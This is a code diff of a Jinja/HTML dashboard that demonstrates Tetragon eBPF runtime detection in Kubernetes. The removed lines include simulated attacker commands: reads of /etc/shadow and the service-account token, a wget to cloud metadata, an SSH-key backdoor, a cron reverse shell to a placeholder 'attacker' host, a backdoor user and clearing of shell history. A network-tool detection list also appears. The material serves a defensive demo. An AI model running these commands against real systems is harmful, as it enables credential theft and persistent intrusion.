@@ -19,528 +19,350 @@
   {% endif %}
 {% endwith %}
 
-<form method="POST" style="display:flex; flex-direction:column; gap:0;">
+<form method="POST" style="display:flex; flex-direction:column; gap:3rem;">
 
-<h1 style="color:#111; margin-bottom:0.4rem;">Tetragon Runtime Security</h1>
-<p style="color:#666; margin-top:0; margin-bottom:2.5rem; font-size:0.95em; line-height:1.6;">
-  eBPF-based kernel-level security observability — detect attacker behaviour inside any container, in real time.
-</p>
+  <!-- Title + What is Tetragon -->
+  <div>
+    <h1 style="color:#111; margin-bottom:0.4rem;">Tetragon Runtime Security</h1>
+    <p style="color:#666; margin:0 0 1.5rem 0; font-size:0.95em; line-height:1.6;">
+      eBPF-based kernel-level security observability — detect attacker behaviour inside any container, in real time.
+    </p>
 
-<!-- ═══════════════════════════════════════════════════════ CURRENT STATUS -->
-<section style="padding-bottom:2rem; border-bottom:1px solid #e0e0e0; margin-bottom:2.5rem;">
-  <div style="display:flex; align-items:center; gap:8px; margin-bottom:12px;">
-    <div style="width:6px; height:20px; background-color:#0066ff; border-radius:2px;"></div>
-    <h3 style="color:#111; margin:0; font-size:1.1rem; letter-spacing:0.3px;">CURRENT STATUS</h3>
-  </div>
-
-  {% if policy_error %}
-    <p style="color:#c00; font-size:0.9em;">⚠️ Could not read TracingPolicies: {{ policy_error }}</p>
-    <p style="color:#888; font-size:0.85em;">Tetragon may not be installed, or the service account lacks ClusterRole permissions.</p>
-  {% else %}
-    {% if active_policies | length > 0 %}
-      <div style="display:inline-flex; align-items:center; gap:8px; background:#fce4ec; border:1px solid #ef9a9a; border-radius:8px; padding:10px 16px; margin-bottom:8px;">
-        <span style="font-size:1.2rem;">🛡️</span>
-        <span style="font-weight:600; color:#b71c1c;">Monitoring active — {{ active_policies | length }} TracingPolic{{ 'y' if active_policies|length == 1 else 'ies' }} deployed</span>
+    <div style="background:#f8f9ff; border:1px solid #d0dbff; border-radius:10px; padding:1.4rem 1.5rem;">
+      <div style="display:flex; align-items:center; gap:8px; margin-bottom:12px;">
+        <div style="width:5px; height:18px; background-color:#0066ff; border-radius:2px;"></div>
+        <h3 style="color:#111; margin:0; font-size:1rem; letter-spacing:0.3px;">WHAT IS TETRAGON?</h3>
       </div>
-      <p style="color:#666; font-size:0.85em; margin:0;">Active: {{ active_policies | join(', ') }}</p>
-    {% else %}
-      <div style="display:inline-flex; align-items:center; gap:8px; background:#f5f5f5; border:1px solid #ccc; border-radius:8px; padding:10px 16px;">
-        <span style="font-size:1.2rem;">⭕</span>
-        <span style="font-weight:600; color:#555;">No TracingPolicies deployed — monitoring inactive</span>
-      </div>
-    {% endif %}
-  {% endif %}
-</section>
-
-<!-- ═══════════════════════════════════════════════════════ ABOUT TETRAGON -->
-<section style="padding-bottom:2rem; border-bottom:1px solid #e0e0e0; margin-bottom:2.5rem;">
-  <div style="display:flex; align-items:center; gap:8px; margin-bottom:12px;">
-    <div style="width:6px; height:20px; background-color:#0066ff; border-radius:2px;"></div>
-    <h3 style="color:#111; margin:0; font-size:1.1rem; letter-spacing:0.3px;">ABOUT TETRAGON</h3>
-  </div>
-
-  <p style="margin:0 0 16px; color:#555; font-size:0.9em; line-height:1.7;">
-    Tetragon is a <strong>Cilium eBPF-based runtime security</strong> engine. Unlike firewalls or
-    network policies that operate at the packet level, Tetragon hooks directly into the
-    <strong>Linux kernel</strong> — observing and optionally enforcing at the syscall level
-    <em>inside every running container</em>, with near-zero overhead and no code changes required.
-  </p>
-
-  <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(180px, 1fr)); gap:12px;">
-    <div style="background:#e8f5e9; border:1px solid #a5d6a7; border-radius:8px; padding:14px; font-size:0.85em;">
-      <strong style="color:#2e7d32; display:block; margin-bottom:5px;">⚡ Process Execution</strong>
-      <p style="color:#555; margin:0; line-height:1.5;">Detect when unexpected binaries run inside pods — shells, curl, wget, nmap.</p>
-    </div>
-    <div style="background:#e3f2fd; border:1px solid #90caf9; border-radius:8px; padding:14px; font-size:0.85em;">
-      <strong style="color:#1565c0; display:block; margin-bottom:5px;">📂 File Access</strong>
-      <p style="color:#555; margin:0; line-height:1.5;">Alert on reads of <code>/etc/shadow</code>, service account tokens, and other sensitive paths.</p>
-    </div>
-    <div style="background:#fff8e1; border:1px solid #ffe082; border-radius:8px; padding:14px; font-size:0.85em;">
-      <strong style="color:#f57f17; display:block; margin-bottom:5px;">🔴 Kill &amp; Enforce</strong>
-      <p style="color:#555; margin:0; line-height:1.5;">Optionally terminate offending processes in real time — not just observe.</p>
-    </div>
-  </div>
-</section>
-
-<!-- ══════════════════════════════════════════════════════ TRACING POLICIES -->
-<section style="padding-bottom:2rem; border-bottom:1px solid #e0e0e0; margin-bottom:2.5rem;">
-  <div style="display:flex; align-items:center; gap:8px; margin-bottom:12px;">
-    <div style="width:6px; height:20px; background-color:#0066ff; border-radius:2px;"></div>
-    <h3 style="color:#111; margin:0; font-size:1.1rem; letter-spacing:0.3px;">TRACING POLICIES</h3>
-  </div>
-
-  <p style="margin:0 0 8px; color:#555; font-size:0.9em; line-height:1.7;">
-    A <strong>TracingPolicy</strong> is a Kubernetes custom resource that tells Tetragon which
-    kernel functions to hook (<em>kprobes</em>) and what to match. When a container triggers a
-    matching syscall — opening a file, executing a binary — Tetragon emits a structured JSON
-    event in real time, visible in the live stream below.
-  </p>
-  <p style="margin:0 0 20px; color:#555; font-size:0.9em; line-height:1.7;">
-    All four policies below are <strong>cluster-wide</strong> — they cover every pod in every
-    namespace, including the attacker simulation jobs.
-  </p>
-
-  <!-- Policy 1 -->
-  <div style="border:1px solid #e0e0e0; border-radius:10px; padding:16px 20px; margin-bottom:12px;">
-    <div style="display:flex; align-items:flex-start; gap:12px; flex-wrap:wrap;">
-      <span style="font-size:1.3rem; margin-top:1px;">📂</span>
-      <div style="flex:1; min-width:200px;">
-        <div style="display:flex; align-items:center; gap:8px; margin-bottom:4px; flex-wrap:wrap;">
-          <strong style="font-size:0.92rem;">detect-sensitive-file-read</strong>
-          {% if 'detect-sensitive-file-read' in active_policies %}
-            <span style="background:#e8f5e9; color:#2e7d32; border:1px solid #a5d6a7; border-radius:4px; padding:2px 8px; font-size:0.75rem; font-weight:600;">ACTIVE</span>
-          {% else %}
-            <span style="background:#f5f5f5; color:#888; border:1px solid #ddd; border-radius:4px; padding:2px 8px; font-size:0.75rem;">INACTIVE</span>
-          {% endif %}
-          <span style="background:#e3f2fd; color:#1565c0; border-radius:4px; padding:2px 8px; font-size:0.75rem;">Credential Hunting</span>
+      <p style="margin:0 0 10px 0; color:#444; font-size:0.92em; line-height:1.75;">
+        <strong>Tetragon</strong> is the runtime security layer built into this cluster alongside Cilium. It uses <strong>eBPF</strong> to hook directly into the Linux kernel — observing system calls inside every running container, with near-zero overhead and no code changes required.
+      </p>
+      <p style="margin:0 0 14px 0; color:#444; font-size:0.92em; line-height:1.75;">
+        By default Tetragon is passive — it can see everything but alerts only on what you configure via <strong>TracingPolicies</strong>. When a policy is deployed, Tetragon matches specific kernel calls and emits structured real-time security events, visible in the live stream below.
+      </p>
+      <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(180px, 1fr)); gap:10px;">
+        <div style="background:#e8f5e9; border:1px solid #a5d6a7; border-radius:8px; padding:12px 14px; font-size:0.85em;">
+          <strong style="color:#2e7d32; display:block; margin-bottom:4px;">Process Execution</strong>
+          <p style="color:#555; margin:0; line-height:1.5;">Detect unexpected binaries inside pods — shells, curl, wget, nmap.</p>
         </div>
-        <p style="margin:0 0 6px; color:#666; font-size:0.85em; line-height:1.5;">
-          kprobe on <code>fd_install</code> — fires whenever any container opens
-          <code>/etc/shadow</code> or <code>/etc/passwd</code>.
-          These files contain hashed passwords and are a primary target in credential-hunting attacks.
+        <div style="background:#e3f2fd; border:1px solid #90caf9; border-radius:8px; padding:12px 14px; font-size:0.85em;">
+          <strong style="color:#1565c0; display:block; margin-bottom:4px;">File Access</strong>
+          <p style="color:#555; margin:0; line-height:1.5;">Alert on reads of <code>/etc/shadow</code>, service account tokens, and sensitive paths.</p>
+        </div>
+        <div style="background:#fff8e1; border:1px solid #ffe082; border-radius:8px; padding:12px 14px; font-size:0.85em;">
+          <strong style="color:#f57f17; display:block; margin-bottom:4px;">Kill &amp; Enforce</strong>
+          <p style="color:#555; margin:0; line-height:1.5;">Optionally terminate offending processes in real time — not just observe.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Current Status -->
+  <section style="padding-bottom:2.5rem; border-bottom:1px solid #e0e0e0;">
+    <div style="border:1px solid #e0e0e0; border-radius:10px; padding:1.2rem 1.5rem;">
+      <div style="display:flex; align-items:center; gap:8px; margin-bottom:12px;">
+        <div style="width:6px; height:20px; background-color:#0066ff; border-radius:2px;"></div>
+        <h3 style="color:#111; margin:0; font-size:1.1rem; letter-spacing:0.3px;">CURRENT STATUS</h3>
+      </div>
+
+      {% if policy_error %}
+        <p style="color:#c00; font-size:0.9em; margin:0;">
+          Could not read TracingPolicies from Kubernetes API: {{ policy_error }}
         </p>
-        <p style="margin:0; color:#999; font-size:0.8em;">Triggered by: <strong>Credential Hunting</strong> simulation</p>
-      </div>
-    </div>
-  </div>
-
-  <!-- Policy 2 -->
-  <div style="border:1px solid #e0e0e0; border-radius:10px; padding:16px 20px; margin-bottom:12px;">
-    <div style="display:flex; align-items:flex-start; gap:12px; flex-wrap:wrap;">
-      <span style="font-size:1.3rem; margin-top:1px;">💻</span>
-      <div style="flex:1; min-width:200px;">
-        <div style="display:flex; align-items:center; gap:8px; margin-bottom:4px; flex-wrap:wrap;">
-          <strong style="font-size:0.92rem;">detect-shell-execution</strong>
-          {% if 'detect-shell-execution' in active_policies %}
-            <span style="background:#e8f5e9; color:#2e7d32; border:1px solid #a5d6a7; border-radius:4px; padding:2px 8px; font-size:0.75rem; font-weight:600;">ACTIVE</span>
-          {% else %}
-            <span style="background:#f5f5f5; color:#888; border:1px solid #ddd; border-radius:4px; padding:2px 8px; font-size:0.75rem;">INACTIVE</span>
-          {% endif %}
-          <span style="background:#fce4ec; color:#b71c1c; border-radius:4px; padding:2px 8px; font-size:0.75rem;">Recon · Persistence</span>
-        </div>
-        <p style="margin:0 0 6px; color:#666; font-size:0.85em; line-height:1.5;">
-          kprobe on <code>security_bprm_check</code> — fires when <code>/bin/sh</code>,
-          <code>/bin/bash</code>, <code>/bin/dash</code>, or <code>/bin/ash</code> executes
-          in any pod. Shells are the primary tool for interactive attacker sessions and
-          post-exploitation scripting.
+        <p style="color:#888; font-size:0.85em; margin:6px 0 0 0;">
+          Tetragon may not be installed, or the service account lacks ClusterRole permissions.
         </p>
-        <p style="margin:0; color:#999; font-size:0.8em;">Triggered by: <strong>Recon</strong> and <strong>Persistence</strong> simulations</p>
-      </div>
-    </div>
-  </div>
-
-  <!-- Policy 3 -->
-  <div style="border:1px solid #e0e0e0; border-radius:10px; padding:16px 20px; margin-bottom:12px;">
-    <div style="display:flex; align-items:flex-start; gap:12px; flex-wrap:wrap;">
-      <span style="font-size:1.3rem; margin-top:1px;">🌐</span>
-      <div style="flex:1; min-width:200px;">
-        <div style="display:flex; align-items:center; gap:8px; margin-bottom:4px; flex-wrap:wrap;">
-          <strong style="font-size:0.92rem;">detect-network-tool</strong>
-          {% if 'detect-network-tool' in active_policies %}
-            <span style="background:#e8f5e9; color:#2e7d32; border:1px solid #a5d6a7; border-radius:4px; padding:2px 8px; font-size:0.75rem; font-weight:600;">ACTIVE</span>
-          {% else %}
-            <span style="background:#f5f5f5; color:#888; border:1px solid #ddd; border-radius:4px; padding:2px 8px; font-size:0.75rem;">INACTIVE</span>
-          {% endif %}
-          <span style="background:#fff8e1; color:#f57f17; border-radius:4px; padding:2px 8px; font-size:0.75rem;">Credential Hunting · Exfiltration</span>
-        </div>
-        <p style="margin:0 0 6px; color:#666; font-size:0.85em; line-height:1.5;">
-          kprobe on <code>security_bprm_check</code> — fires when network or exfiltration tools
-          execute: <code>wget</code>, <code>curl</code>, <code>nc</code>, <code>ncat</code>,
-          <code>netcat</code>, or <code>nmap</code>.
-          These binaries are used for C2 callbacks, reverse shells, lateral scanning, and data exfiltration.
-        </p>
-        <p style="margin:0; color:#999; font-size:0.8em;">Triggered by: <strong>Credential Hunting</strong> simulation (wget to AWS IMDS)</p>
-      </div>
-    </div>
-  </div>
-
-  <!-- Policy 4 -->
-  <div style="border:1px solid #e0e0e0; border-radius:10px; padding:16px 20px; margin-bottom:20px;">
-    <div style="display:flex; align-items:flex-start; gap:12px; flex-wrap:wrap;">
-      <span style="font-size:1.3rem; margin-top:1px;">🔑</span>
-      <div style="flex:1; min-width:200px;">
-        <div style="display:flex; align-items:center; gap:8px; margin-bottom:4px; flex-wrap:wrap;">
-          <strong style="font-size:0.92rem;">detect-k8s-secret-access</strong>
-          {% if 'detect-k8s-secret-access' in active_policies %}
-            <span style="background:#e8f5e9; color:#2e7d32; border:1px solid #a5d6a7; border-radius:4px; padding:2px 8px; font-size:0.75rem; font-weight:600;">ACTIVE</span>
-          {% else %}
-            <span style="background:#f5f5f5; color:#888; border:1px solid #ddd; border-radius:4px; padding:2px 8px; font-size:0.75rem;">INACTIVE</span>
-          {% endif %}
-          <span style="background:#e8f5e9; color:#2e7d32; border-radius:4px; padding:2px 8px; font-size:0.75rem;">Lateral Movement</span>
-        </div>
-        <p style="margin:0 0 6px; color:#666; font-size:0.85em; line-height:1.5;">
-          kprobe on <code>fd_install</code> — fires when any process reads the Kubernetes
-          service account token at
-          <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.
-          This JWT token is the primary credential attackers use to escape a compromised pod
-          and interact directly with the Kubernetes API for lateral movement.
-        </p>
-        <p style="margin:0; color:#999; font-size:0.8em;">Triggered by: <strong>Credential Hunting</strong> simulation</p>
-      </div>
-    </div>
-  </div>
-
-  <div style="display:flex; gap:12px; flex-wrap:wrap;">
-    {% if active_policies | length > 0 %}
-    <button type="submit" name="action" value="remove"
-            style="background-color:#c62828; color:#fff; border:none; padding:10px 24px;
-                   border-radius:6px; font-weight:500; cursor:pointer; font-size:0.92rem;">
-      ✖ Remove All TracingPolicies
-    </button>
-    {% else %}
-    <button type="submit" name="action" value="deploy"
-            style="background-color:#0066ff; color:#fff; border:none; padding:10px 24px;
-                   border-radius:6px; font-weight:500; cursor:pointer; font-size:0.92rem;">
-      🛡️ Deploy All TracingPolicies
-    </button>
-    {% endif %}
-  </div>
-</section>
-
-<!-- ═══════════════════════════════════════════════════ ATTACKER LIFECYCLE -->
-<section style="padding-bottom:2rem; border-bottom:1px solid #e0e0e0; margin-bottom:2.5rem;">
-  <div style="display:flex; align-items:center; gap:8px; margin-bottom:12px;">
-    <div style="width:6px; height:20px; background-color:#d32f2f; border-radius:2px;"></div>
-    <h3 style="color:#111; margin:0; font-size:1.1rem; letter-spacing:0.3px;">SIMULATE ATTACK</h3>
-  </div>
-
-  <p style="margin:0 0 20px; color:#555; font-size:0.9em; line-height:1.7;">
-    When an attacker exploits a vulnerability and gains code execution inside a container,
-    their next actions follow a <strong>predictable playbook</strong>. The simulations below
-    replay the most common phases — each runs as a short-lived Kubernetes Job that Tetragon
-    can observe and alert on.
-  </p>
-
-  <!-- Attacker lifecycle timeline -->
-  <div style="background:#f8f9fa; border:1px solid #e2e4e8; border-radius:10px; padding:18px 20px; margin-bottom:24px; overflow-x:auto;">
-    <div style="font-size:0.68em; font-weight:700; color:#aaa; letter-spacing:0.7px; margin-bottom:14px;">ATTACKER LIFECYCLE (Linux / Container)</div>
-    <div style="display:flex; gap:0; min-width:560px; align-items:stretch;">
-
-      {% set phases = [
-        ('🔍', '1', 'Recon', 'Understand the environment: who am I, where am I, what can I reach?', '#e3f2fd', '#1565c0', 'simulate_recon'),
-        ('🔑', '2', 'Credential\nHunting', 'Find passwords, API keys, and Kubernetes tokens.', '#fff8e1', '#e65100', 'simulate_credentials'),
-        ('⬆️', '3', 'Privilege\nEscalation', 'Exploit SUID binaries or misconfigs to become root.', '#f3e5f5', '#6a1b9a', None),
-        ('🪝', '4', 'Persistence', 'Install backdoors so access survives pod restarts.', '#fce4ec', '#b71c1c', 'simulate_persistence'),
-        ('↔️', '5', 'Lateral\nMovement', 'Use found tokens to pivot to other pods or services.', '#e8f5e9', '#2e7d32', None),
-        ('📤', '6', 'Exfiltration\n& Cover', 'Steal data, wipe logs, hide tracks.', '#efebe9', '#4e342e', None),
-      ] %}
-
-      {% for icon, num, label, desc, bg, fg, action in phases %}
-      <div style="flex:1; min-width:88px; display:flex; flex-direction:column;">
-        <div style="background:{{ bg }}; border:1px solid {{ fg }}33; border-radius:{% if loop.first %}8px 0 0 8px{% elif loop.last %}0 8px 8px 0{% else %}0{% endif %}; padding:12px 10px; text-align:center; flex:1; position:relative;">
-          {% if not loop.last %}
-          <div style="position:absolute; right:-1px; top:50%; transform:translateY(-50%);
-                      width:0; height:0;
-                      border-top:10px solid transparent;
-                      border-bottom:10px solid transparent;
-                      border-left:10px solid {{ fg }}33;
-                      z-index:2;">
+      {% else %}
+        {% if active_policies | length > 0 %}
+          <div style="display:inline-flex; align-items:center; gap:8px; background:#e8f5e9; border:1px solid #4caf50; border-radius:8px; padding:10px 16px;">
+            <span style="font-weight:600; color:#2e7d32;">Monitoring active — {{ active_policies | length }} TracingPolic{{ 'y' if active_policies|length == 1 else 'ies' }} deployed</span>
           </div>
-          {% endif %}
-          <div style="font-size:1.3rem; margin-bottom:4px;">{{ icon }}</div>
-          <div style="font-size:0.65em; font-weight:700; color:{{ fg }}; letter-spacing:0.4px; margin-bottom:2px;">PHASE {{ num }}</div>
-          <div style="font-size:0.75em; font-weight:600; color:#333; white-space:pre-line; line-height:1.3;">{{ label }}</div>
-          {% if action %}
-          <div style="margin-top:6px;">
-            <span style="background:{{ fg }}; color:#fff; border-radius:3px; padding:2px 6px; font-size:0.62em; font-weight:700; letter-spacing:0.3px;">SIMULATED</span>
-          </div>
-          {% else %}
-          <div style="margin-top:6px;">
-            <span style="background:#ddd; color:#888; border-radius:3px; padding:2px 6px; font-size:0.62em; font-weight:600;">MANUAL</span>
-          </div>
-          {% endif %}
-        </div>
-      </div>
-      {% endfor %}
-
-    </div>
-  </div>
-
-  <!-- Simulation scenario cards -->
-  <div style="display:flex; flex-direction:column; gap:16px;">
-
-    <!-- Card 1: Recon -->
-    <div style="border:1px solid #e0e0e0; border-radius:10px; overflow:hidden;">
-      <div style="background:#e3f2fd; padding:14px 20px; display:flex; align-items:center; gap:12px;">
-        <span style="font-size:1.5rem;">🔍</span>
-        <div>
-          <div style="font-weight:700; color:#1565c0; font-size:0.95rem;">Phase 1 — Recon / Environment Discovery</div>
-          <div style="color:#555; font-size:0.82em; margin-top:2px;">First commands an attacker runs to understand where they are and what they can reach</div>
-        </div>
-      </div>
-      <div style="padding:16px 20px;">
-        <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:14px;">
-          <div>
-            <div style="font-size:0.7em; font-weight:700; color:#aaa; letter-spacing:0.6px; margin-bottom:6px;">COMMANDS EXECUTED</div>
-            <pre style="background:#1e1e1e; color:#d4d4d4; border-radius:6px; padding:10px 12px; font-size:0.75em; margin:0; line-height:1.7; overflow-x:auto;">whoami; id; groups
-uname -a; hostname
-cat /etc/os-release
-cat /proc/1/cgroup        # container check
-ls /var/run/secrets/      # k8s secrets
-env | sort                # env vars
-find / -perm -4000 2>/dev/null  # SUID
-ls -la /</pre>
-          </div>
-          <div>
-            <div style="font-size:0.7em; font-weight:700; color:#aaa; letter-spacing:0.6px; margin-bottom:6px;">TETRAGON DETECTS</div>
-            <div style="display:flex; flex-direction:column; gap:6px;">
-              <div style="background:#f5f5f5; border-radius:6px; padding:8px 10px; font-size:0.8em;">
-                <span style="color:#d2a8ff; font-weight:700;">EXEC</span>
-                <span style="color:#555; margin-left:6px;">— every binary launched (sh, find, ls…)</span>
-              </div>
-              <div style="background:#f5f5f5; border-radius:6px; padding:8px 10px; font-size:0.8em;">
-                <span style="color:#ff7b72; font-weight:700;">KPROBE</span>
-                <span style="color:#555; margin-left:6px;">— shell execution via <code>security_bprm_check</code></span>
-              </div>
-            </div>
-            <div style="margin-top:8px; font-size:0.78em; color:#888;">
-              Policy: <code>detect-shell-execution</code>
-            </div>
-          </div>
-        </div>
-        {% if 'recon' in running_sims %}
-          <button type="submit" name="action" value="stop_attacks"
-                  style="background-color:#c62828; color:#fff; border:none; padding:9px 20px;
-                         border-radius:6px; font-weight:500; cursor:pointer; font-size:0.88rem;">
-            🛑 Stop Recon Simulation
-          </button>
+          <p style="color:#666; font-size:0.88em; margin:8px 0 0 0;">Active: {{ active_policies | join(', ') }}</p>
         {% else %}
-          <button type="submit" name="action" value="simulate_recon"
-                  style="background-color:#1565c0; color:#fff; border:none; padding:9px 20px;
-                         border-radius:6px; font-weight:500; cursor:pointer; font-size:0.88rem;">
-            🔍 Launch Recon Simulation
-          </button>
+          <div style="display:inline-flex; align-items:center; gap:8px; background:#e3f2fd; border:1px solid #42a5f5; border-radius:8px; padding:10px 16px;">
+            <span style="font-weight:600; color:#1565c0;">No TracingPolicies deployed — monitoring inactive</span>
+          </div>
         {% endif %}
-      </div>
+      {% endif %}
     </div>
+  </section>
 
-    <!-- Card 2: Credential Hunting -->
-    <div style="border:1px solid #e0e0e0; border-radius:10px; overflow:hidden;">
-      <div style="background:#fff8e1; padding:14px 20px; display:flex; align-items:center; gap:12px;">
-        <span style="font-size:1.5rem;">🔑</span>
-        <div>
-          <div style="font-weight:700; color:#e65100; font-size:0.95rem;">Phase 2 — Credential Hunting</div>
-          <div style="color:#555; font-size:0.82em; margin-top:2px;">Read sensitive files, service account tokens, and cloud metadata to find usable credentials</div>
-        </div>
-      </div>
-      <div style="padding:16px 20px;">
-        <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:14px;">
-          <div>
-            <div style="font-size:0.7em; font-weight:700; color:#aaa; letter-spacing:0.6px; margin-bottom:6px;">COMMANDS EXECUTED</div>
-            <pre style="background:#1e1e1e; color:#d4d4d4; border-radius:6px; padding:10px 12px; font-size:0.75em; margin:0; line-height:1.7; overflow-x:auto;">cat /etc/shadow           # password hashes
-cat /etc/passwd           # user accounts
-cat /var/run/secrets/     # k8s SA token
-  kubernetes.io/serviceaccount/token
-env | grep -iE 'secret|token|key'
-wget http://169.254.169.254/ # AWS IMDS</pre>
-          </div>
-          <div>
-            <div style="font-size:0.7em; font-weight:700; color:#aaa; letter-spacing:0.6px; margin-bottom:6px;">TETRAGON DETECTS</div>
-            <div style="display:flex; flex-direction:column; gap:6px;">
-              <div style="background:#f5f5f5; border-radius:6px; padding:8px 10px; font-size:0.8em;">
-                <span style="color:#ff7b72; font-weight:700;">KPROBE</span>
-                <span style="color:#555; margin-left:6px;">— <code>fd_install</code> on /etc/shadow, /etc/passwd</span>
-              </div>
-              <div style="background:#f5f5f5; border-radius:6px; padding:8px 10px; font-size:0.8em;">
-                <span style="color:#ff7b72; font-weight:700;">KPROBE</span>
-                <span style="color:#555; margin-left:6px;">— <code>fd_install</code> on k8s SA token</span>
-              </div>
-              <div style="background:#f5f5f5; border-radius:6px; padding:8px 10px; font-size:0.8em;">
-                <span style="color:#ff7b72; font-weight:700;">KPROBE</span>
-                <span style="color:#555; margin-left:6px;">— <code>security_bprm_check</code> on wget</span>
-              </div>
-            </div>
-            <div style="margin-top:8px; font-size:0.78em; color:#888;">
-              Policies: <code>detect-sensitive-file-read</code>, <code>detect-k8s-secret-access</code>, <code>detect-network-tool</code>
-            </div>
-          </div>
-        </div>
-        {% if 'credentials' in running_sims %}
-          <button type="submit" name="action" value="stop_attacks"
-                  style="background-color:#c62828; color:#fff; border:none; padding:9px 20px;
-                         border-radius:6px; font-weight:500; cursor:pointer; font-size:0.88rem;">
-            🛑 Stop Credential Hunting Simulation
-          </button>
-        {% else %}
-          <button type="submit" name="action" value="simulate_credentials"
-                  style="background-color:#e65100; color:#fff; border:none; padding:9px 20px;
-                         border-radius:6px; font-weight:500; cursor:pointer; font-size:0.88rem;">
-            🔑 Launch Credential Hunting Simulation
-          </button>
-        {% endif %}
-      </div>
-    </div>
-
-    <!-- Card 3: Persistence -->
-    <div style="border:1px solid #e0e0e0; border-radius:10px; overflow:hidden;">
-      <div style="background:#fce4ec; padding:14px 20px; display:flex; align-items:center; gap:12px;">
-        <span style="font-size:1.5rem;">🪝</span>
-        <div>
-          <div style="font-weight:700; color:#b71c1c; font-size:0.95rem;">Phase 3 — Persistence Attempts</div>
-          <div style="color:#555; font-size:0.82em; margin-top:2px;">Try to install backdoors so access survives restarts — SSH keys, cron jobs, new users</div>
-        </div>
-      </div>
-      <div style="padding:16px 20px;">
-        <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:14px;">
-          <div>
-            <div style="font-size:0.7em; font-weight:700; color:#aaa; letter-spacing:0.6px; margin-bottom:6px;">COMMANDS EXECUTED</div>
-            <pre style="background:#1e1e1e; color:#d4d4d4; border-radius:6px; padding:10px 12px; font-size:0.75em; margin:0; line-height:1.7; overflow-x:auto;"># SSH backdoor
-echo 'ssh-rsa AAAA...' \
-  >> /root/.ssh/authorized_keys
-
-# Cron reverse shell
-echo '* * * * * root bash -i \
-  >& /dev/tcp/attacker/4444 0>&1' \
-  > /etc/cron.d/backdoor
-
-# New user
-useradd -m -s /bin/sh backdoor
-
-# Cover tracks
-history -c; rm ~/.bash_history</pre>
-          </div>
-          <div>
-            <div style="font-size:0.7em; font-weight:700; color:#aaa; letter-spacing:0.6px; margin-bottom:6px;">TETRAGON DETECTS</div>
-            <div style="display:flex; flex-direction:column; gap:6px;">
-              <div style="background:#f5f5f5; border-radius:6px; padding:8px 10px; font-size:0.8em;">
-                <span style="color:#ff7b72; font-weight:700;">KPROBE</span>
-                <span style="color:#555; margin-left:6px;">— shell execution throughout the script</span>
-              </div>
-              <div style="background:#f5f5f5; border-radius:6px; padding:8px 10px; font-size:0.8em;">
-                <span style="color:#d2a8ff; font-weight:700;">EXEC</span>
-                <span style="color:#555; margin-left:6px;">— useradd, mkdir, echo, rm binaries</span>
-              </div>
-            </div>
-            <div style="margin-top:8px; font-size:0.78em; color:#888;">
-              Policies: <code>detect-shell-execution</code>, <code>detect-sensitive-file-read</code>
-            </div>
-            <div style="margin-top:8px; background:#fff8e1; border:1px solid #ffe082; border-radius:6px; padding:7px 10px; font-size:0.78em; color:#5d4037;">
-              ⚠️ Most attempts will fail (container has no root) — but Tetragon sees the attempts regardless.
-            </div>
-          </div>
-        </div>
-        <div style="display:flex; gap:10px; flex-wrap:wrap;">
-          {% if 'persistence' in running_sims %}
-          <button type="submit" name="action" value="stop_attacks"
-                  style="background-color:#c62828; color:#fff; border:none; padding:9px 20px;
-                         border-radius:6px; font-weight:500; cursor:pointer; font-size:0.88rem;">
-            🛑 Stop Persistence Simulation
-          </button>
-          {% else %}
-          <button type="submit" name="action" value="simulate_persistence"
-                  style="background-color:#b71c1c; color:#fff; border:none; padding:9px 20px;
-                         border-radius:6px; font-weight:500; cursor:pointer; font-size:0.88rem;">
-            🪝 Launch Persistence Simulation
-          </button>
-          {% endif %}
-        </div>
-      </div>
-    </div>
-
-  </div>
-</section>
-
-<!-- ════════════════════════════════════════════════ WHAT TO EXPECT -->
-<section style="padding-bottom:2rem; border-bottom:1px solid #e0e0e0; margin-bottom:2.5rem;">
-  <div style="display:flex; align-items:center; gap:8px; margin-bottom:12px;">
-    <div style="width:6px; height:20px; background-color:#0066ff; border-radius:2px;"></div>
-    <h3 style="color:#111; margin:0; font-size:1.1rem; letter-spacing:0.3px;">WHAT TO EXPECT IN THE STREAM</h3>
-  </div>
-
-  <p style="margin:0 0 14px; color:#555; font-size:0.9em; line-height:1.6;">
-    Tetragon emits four event types, each colour-coded in the stream below:
-  </p>
-
-  <div style="display:flex; flex-direction:column; gap:10px;">
-    <div style="background:#1e0a2e; border:1px solid #6e3da0; border-radius:8px; padding:14px 18px;">
-      <div style="font-family:monospace; font-size:0.85rem; color:#d2a8ff; font-weight:700; margin-bottom:6px;">EXEC — purple</div>
-      <p style="margin:0; color:#ccc; font-size:0.85em; line-height:1.6;">
-        Fired for every binary the attacker pod launches: <code>sh</code>, <code>cat</code>,
-        <code>find</code>, <code>whoami</code>, <code>wget</code>, <code>useradd</code> etc.
-        These are process start events — Tetragon sees every execution across all pods.
-      </p>
-    </div>
-    <div style="background:#2d0a0a; border:1px solid #a03d3d; border-radius:8px; padding:14px 18px;">
-      <div style="font-family:monospace; font-size:0.85rem; color:#ff7b72; font-weight:700; margin-bottom:6px;">KPROBE — red &nbsp;⚠ these are the security alerts</div>
-      <p style="margin:0 0 8px; color:#ccc; font-size:0.85em; line-height:1.6;">
-        Kernel probe events that fired because a TracingPolicy matched a syscall:
-      </p>
-      <ul style="margin:0; padding-left:18px; color:#ccc; font-size:0.85em; line-height:2;">
-        <li><code style="color:#ff7b72;">fd_install</code> — file opened matching <code>/etc/shadow</code> / <code>/etc/passwd</code></li>
-        <li><code style="color:#ff7b72;">fd_install</code> — Kubernetes service account token read</li>
-        <li><code style="color:#ff7b72;">security_bprm_check</code> — shell or network tool binary executed</li>
-      </ul>
-    </div>
-    <div style="background:#161b22; border:1px solid #3d444d; border-radius:8px; padding:14px 18px;">
-      <div style="font-family:monospace; font-size:0.85rem; color:#8b949e; font-weight:700; margin-bottom:6px;">EXIT — grey</div>
-      <p style="margin:0; color:#ccc; font-size:0.85em; line-height:1.6;">
-        Process termination events emitted when each binary finishes. Paired with EXEC events,
-        they give you the complete process lifecycle.
-      </p>
-    </div>
-  </div>
-</section>
-
-<!-- ══════════════════════════════════════════════════ LIVE EVENT STREAM -->
-<section>
